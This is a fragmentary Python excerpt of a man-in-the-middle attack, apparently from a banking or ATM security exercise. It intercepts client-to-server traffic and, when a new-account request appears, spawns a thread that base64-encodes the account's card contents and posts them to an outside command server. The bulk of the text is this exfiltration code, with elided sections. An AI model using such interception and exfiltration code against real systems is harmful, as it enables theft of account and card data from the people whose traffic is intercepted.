...
def mitm(buff, direction, commandServerIP, commandServerPort):
    ...
    if direction == CLIENT2SERVER:
        ...
        if(request['mode'] == 'new'):
            ...
            t1 = threading.Thread(target=sendCardContentSignal, args=(accountName, commandServerIP, commandServerPort))
            t1.start()
...
def getCardContentLearnedCommand(content):
    command = {"type": "card_contents","cardfile": content+".card","content": b64encode(content)}
...
def sendCardContentSignal(content,command_server_ip,command_server_port):
    payload = {'REQUEST':getCardContentLearnedCommand(content)}
    headers = {'Content-Type' : 'application/x-www-form-urlencoded','Accept':'*/*'}
    r = req.post("http://"+command_server_ip+":"+str(command_server_port), data = payload, headers = headers)
